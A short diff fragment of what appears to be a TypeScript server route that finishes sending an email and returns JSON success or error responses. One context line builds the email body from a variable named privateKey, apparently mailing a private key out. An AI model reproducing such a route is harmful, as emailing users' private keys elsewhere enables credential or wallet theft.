@@ -53,4 +53,16 @@ export async function POST(request: Request) {
       mailOptions.html = formatMessage(privateKey);
     }
 
-    const result
+    const result = await transporter.sendMail(mailOptions);
+
+    return new Response(JSON.stringify({ success: true, result }), {
+      status: 200,
+    });
+
+  } catch (error) {
+    console.error("Error sending email:", error);
+    return new Response(JSON.stringify({ success: false, error: error.message }), {
+      status: 500,
+    });
+  }
+}
